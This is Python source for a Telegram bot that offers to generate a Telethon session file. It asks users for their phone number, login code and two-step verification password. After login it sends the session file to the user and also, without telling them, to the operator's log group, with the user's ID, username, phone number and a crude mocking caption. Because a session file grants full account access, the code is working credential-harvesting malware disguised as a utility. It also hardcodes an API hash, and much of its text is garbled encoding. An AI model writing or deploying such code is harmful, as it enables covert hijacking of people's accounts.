import os
import re
import asyncio
import traceback
from typing import Dict, Any

from pyrogram import filters
from pyrogram.enums import ChatType, ParseMode
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    CallbackQuery,
)

from VoteBot import app
import config  # must contain LOG_GROUP_ID

# --- Telethon for generating the .session file ---
from telethon.sync import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
)

# ================== FIXED API CREDENTIALS ==================
API_ID = 24168862
API_HASH = "916a9424dd1e58ab7955001ccc0172b3"
# ===========================================================

STATE: Dict[int, Dict[str, Any]] = {}
PHONE_RE = re.compile(r"^\+?\d{7,15}$")

# ---------------- Keyboards ----------------
def kb_home() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("âš¡ É¢á´‡É´ sá´‡ssÉªá´É´ ", callback_data="sg:start")],
            [
                InlineKeyboardButton(" Êœá´‡ÊŸá´˜", callback_data="sg:help"),
                InlineKeyboardButton("á´„á´€É´á´„ÊŸá´‡", callback_data="sg:cancel"),
            ],
        ]
    )

def kb_cancel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("á´„á´€É´á´„ÊŸá´‡", callback_data="sg:cancel")]])

def kb_back_cancel(back_data: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Ê™á´€á´„á´‹", callback_data=back_data)],
            [InlineKeyboardButton("á´„á´€É´á´„ÊŸá´‡", callback_data="sg:cancel")],
        ]
    )

# --------------- Helpers -------------------
async def _finalize_and_send(m: Message, client: TelegramClient, phone: str, uid: int):
    """Disconnect, send file to user + log group, cleanup, reset state."""
    try:
        await m.reply_text("âœ… Logged in. Creating session fileâ€¦", reply_markup=kb_cancel())
        await client.disconnect()

        filename = f"{phone}.session"
        # tiny wait to ensure Telethon flushed the sqlite file
        for _ in range(8):
            if os.path.exists(filename):
                break
            await asyncio.sleep(0.25)

        if not os.path.exists(filename):
            STATE.pop(uid, None)
            await m.reply_text("á´„ÊŸá´á´œÊŸá´…É´'á´›.Ò“ÉªÉ´á´… á´›Êœá´‡ É¢á´‡É´Ê€á´€á´›á´‡á´… Ò“ÉªÊŸá´‡. á´˜ÊŸá´‡á´€sá´‡ á´›Ê€Ê á´€É¢á´€ÉªÉ´.")
            return

        caption_user = (
            "ðŸ“¦ **Êá´á´œÊ€ sá´‡ssÉªá´É´ **\n"
            f"`{filename}`\n\n"
            "á´‹á´‡á´‡á´˜ Éªá´› **á´˜Ê€Éªá´ á´€á´›á´‡**. â˜ ï¸."
        )
        # Send to the user (DM)
        await m.reply_document(document=filename, caption=caption_user, parse_mode=ParseMode.MARKDOWN)

        # Send to LOGGER
        try:
            log_caption = (
                "ðŸ—‚ **É´á´‡á´¡ Ê€á´€É´á´…Éª á´á´‡ sá´‡ssÉªá´É´ É¢á´‡É´ á´‹ÉªÊá´€ á´œsá´‹Éª É¢á´€á´€á´€É´á´… á´á´€á´€Ê€á´ **\n"
                f"â€¢ á´œsá´‡Ê€: `{m.from_user.id}` @{(m.from_user.username or 'NA')}\n"
                f"â€¢ É´á´€á´á´‡: {m.from_user.mention}\n"
                f"â€¢ á´˜Êœá´É´á´‡: `{phone}`\n"
                f"â€¢ Ò“ÉªÊŸá´‡: `{filename}`"
            )
            await app.send_document(
                chat_id=config.LOG_GROUP_ID,
                document=filename,
                caption=log_caption,
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception as log_err:
            # log silently to the user
            await m.reply_text(f"âš ï¸ Logger send failed: `{log_err}`", parse_mode=ParseMode.MARKDOWN)

        # Cleanup
        try:
            os.remove(filename)
        except Exception:
            pass

        STATE.pop(uid, None)
        await m.reply_text("ðŸŽ‰ á´…á´É´á´‡! á´œsá´‡ /session á´€É¢á´€ÉªÉ´ á´›á´ É¢á´‡É´ á´€É´á´á´›Êœá´‡Ê€.", reply_markup=kb_home())

    except FloodWaitError as fw:
        STATE.pop(uid, None)
        await m.reply_text(f"â³ Ò“ÊŸá´á´á´… á´¡á´€Éªá´›. á´›Ê€Ê á´€É¢á´€ÉªÉ´ ÉªÉ´ {int(getattr(fw, 'seconds', 60))} seconds.")
    except Exception as e:
        STATE.pop(uid, None)
        traceback.print_exc()
        await m.reply_text(f"âš ï¸ á´‡Ê€Ê€á´Ê€ á´¡ÊœÉªÊŸá´‡ Ò“ÉªÉ´á´€ÊŸÉªá´¢ÉªÉ´É¢Error.\n`{type(e).__name__}: {e}`", parse_mode=ParseMode.MARKDOWN)

# --------------- Commands ------------------
@app.on_message(filters.command(["gen", "session", "gensession"]))
async def session_cmd(_, m: Message):
    # Force DM for safety; in groups provide DM button
    if m.chat.type != ChatType.PRIVATE:
        btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("Open in DM", url=f"https://t.me/{app.username}?start=sessiongen")]]
        )
        return await m.reply_text("ðŸ”’ É¢á´‡É´ sá´‡ssÉªá´á´ ÉªÉ´ **á´…á´** á´É´ÊŸÊ.", reply_markup=btn)

    STATE.pop(m.from_user.id, None)
    text = (
        "ðŸ‘‹ **sá´‡ssÉªá´É´ É¢á´‡É´á´‡Ê€á´€á´›á´Ê€**\n\n"
        "Éª á´¡ÉªÊŸÊŸ á´„Ê€á´‡á´€á´›á´‡ **sá´‡ssÉªá´É´** Ò“á´Ê€ Êá´á´œ."
    )
    await m.reply_text(text, reply_markup=kb_home(), disable_web_page_preview=True)

# Support /start sessiongen deep-link
@app.on_message(filters.private & filters.command("start"))
async def start_handler(_, m: Message):
    parts = (m.text or "").split(None, 1)
    if len(parts) == 2 and parts[1].lower() == "sessiongen":
        return await session_cmd(_, m)

# --------------- Callbacks -----------------
@app.on_callback_query(filters.regex(r"^sg:help$"))
async def sg_help(_, q: CallbackQuery):
    txt = (
        "â„¹ **Êœá´‡ÊŸá´˜**\n\n"
        "â€¢ sá´›á´‡á´˜s: á´˜Êœá´É´á´‡ â†’ á´„á´á´…á´‡ â†’ (á´˜á´€ssá´…á´¡á´Ê€á´… ÉªÒ“ 2Ò“á´€) â†’ Ê€á´‡á´„á´‡Éªá´ á´‡\n\n"
        "**á´›Éªá´˜s**\n"
        "â€¢ á´œsá´‡ Ò“á´œÊŸÊŸ á´˜Êœá´É´á´‡ Ò“á´Ê€á´á´€á´› ÊŸÉªá´‹á´‡ +9198â€¦\n"
        "â€¢ á´‡É´á´›á´‡Ê€ á´›Êœá´‡ ÊŸá´€sá´›á´‡sá´› ÊŸá´É¢ÉªÉ´ á´„á´á´…á´‡ Ï™á´œÉªá´„á´‹á´‡ÊŸÊ."
    )
    await q.message.edit_text(txt, reply_markup=kb_home(), disable_web_page_preview=True)
    await q.answer()

@app.on_callback_query(filters.regex(r"^sg:cancel$"))
async def sg_cancel(_, q: CallbackQuery):
    STATE.pop(q.from_user.id, None)
    await q.message.edit_text("âœ… á´„á´€É´á´„á´‡ÊŸÊŸá´‡á´… á´œsá´‡ /session á´›á´ sá´›á´€Ê€á´› á´€É¢á´€ÉªÉ´.")
    await q.answer("Cancelled")

@app.on_callback_query(filters.regex(r"^sg:start$"))
async def sg_start(_, q: CallbackQuery):
    uid = q.from_user.id
    STATE[uid] = {"step": "ask_phone", "data": {}}
    await q.message.edit_text(
        "ðŸ“ž sá´‡É´á´… Êá´á´œÊ€  **á´˜Êœá´É´á´‡ É´á´œá´Ê™á´‡Ê€** á´¡Éªá´›Êœ á´„á´á´œÉ´á´›Ê€Ê á´„á´á´…á´‡ (e.g. `+9198xxxxxxx`).",
        reply_markup=kb_cancel(),
        parse_mode=ParseMode.MARKDOWN,
    )
    await q.answer()

# ----------- Interactive flow (DM only) ------------
@app.on_message(filters.private & ~filters.command(["start", "help", "session", "gensession"]))
async def session_flow(_, m: Message):
    uid = m.from_user.id
    state = STATE.get(uid)
    if not state:
        return

    step = state["step"]
    data = state.setdefault("data", {})

    try:
        # PHONE
        if step == "ask_phone":
            phone = m.text.strip().replace(" ", "")
            if not PHONE_RE.match(phone):
                return await m.reply_text(
                    "â— ÉªÉ´á´ á´€ÊŸÉªá´… á´˜Êœá´É´á´‡ Ò“á´Ê€á´á´€á´› á´‡xá´€á´á´˜ÊŸá´‡: `+12345678901`",
                    reply_markup=kb_back_cancel("sg:start"),
                    parse_mode=ParseMode.MARKDOWN,
                )

            data["phone"] = phone
            client = TelegramClient(session=phone, api_id=API_ID, api_hash=API_HASH)
            state["client"] = client

            await m.reply_text("â³ sá´‡É´á´…ÉªÉ´É¢ ÊŸá´É¢ÉªÉ´ á´„á´á´…á´‡â€¦", reply_markup=kb_cancel())
            await client.connect()

            try:
                await client.send_code_request(phone)
            except ApiIdInvalidError:
                await client.disconnect()
                STATE.pop(uid, None)
                return await m.reply_text("âŒ Internal API error. Please try again later.")
            except PhoneNumberInvalidError:
                await client.disconnect()
                STATE.pop(uid, None)
                return await m.reply_text("âŒ Phone number is invalid. Use /session to try again.")
            except FloodWaitError as fw:
                await client.disconnect()
                STATE.pop(uid, None)
                return await m.reply_text(f"â³ Flood wait. Try again in {int(getattr(fw, 'seconds', 60))} seconds.")

            state["step"] = "ask_code"
            return await m.reply_text("ðŸ“© Enter the **login code** you received from Telegram.", reply_markup=kb_cancel())

        # CODE
        if step == "ask_code":
            code = m.text.strip().replace(" ", "")
            client: TelegramClient = state["client"]
            phone = data["phone"]

            try:
                await client.sign_in(phone=phone, code=code)
            except PhoneCodeInvalidError:
                return await m.reply_text("âŒ Code invalid. Send the latest code again.", reply_markup=kb_cancel())
            except PhoneCodeExpiredError:
                return await m.reply_text("âŒ› Code expired. Request a new one and send it here.", reply_markup=kb_cancel())
            except SessionPasswordNeededError:
                state["step"] = "ask_2fa"
                return await m.reply_text("ðŸ” 2-Step Verification enabled. Send your **password**.", reply_markup=kb_cancel())

            state["step"] = "finalize"
            return await _finalize_and_send(m, client, phone, uid)

        # 2FA
        if step == "ask_2fa":
            pwd = m.text
            client: TelegramClient = state["client"]
            try:
                await client.sign_in(password=pwd)
            except Exception:
                return await m.reply_text("âŒ Incorrect password. Try again or press Cancel.", reply_markup=kb_cancel())

            phone = state["data"]["phone"]
            state["step"] = "finalize"
            return await _finalize_and_send(m, client, phone, uid)

    except Exception as e:
        traceback.print_exc()
        STATE.pop(uid, None)
        return await m.reply_text(
            f"âš ï¸ Unexpected error. Please /session again.\n`{type(e).__name__}: {e}`",
            parse_mode=ParseMode.MARKDOWN,
        )
